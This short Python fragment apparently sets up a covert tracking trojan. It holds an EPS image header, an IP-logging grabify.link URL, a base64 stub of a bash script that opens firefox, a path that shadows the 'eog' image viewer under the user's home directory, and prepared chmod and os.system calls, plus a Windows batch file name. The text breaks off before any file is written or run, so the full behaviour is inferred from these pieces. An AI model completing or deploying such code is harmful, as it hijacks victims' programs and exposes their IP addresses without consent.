import os

imHeader = '%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: -0 -0 42 42'
resource = 'https://grabify.link/Q3DBUI'
innernix = b"IyEvYmluL2Jhc2gKZmlyZWZveCA"
innerwin = b""
progname = '/.local/bin/eog'
platform = os.name
wrapper = os.system
chx = 'chmod +x'

if os.name != 'nt':
    home = f'/home/{os.getlogin()}'
    py = 'python3 test.py '
else:
    py = 'python test.py '
    name = 'a.bat'
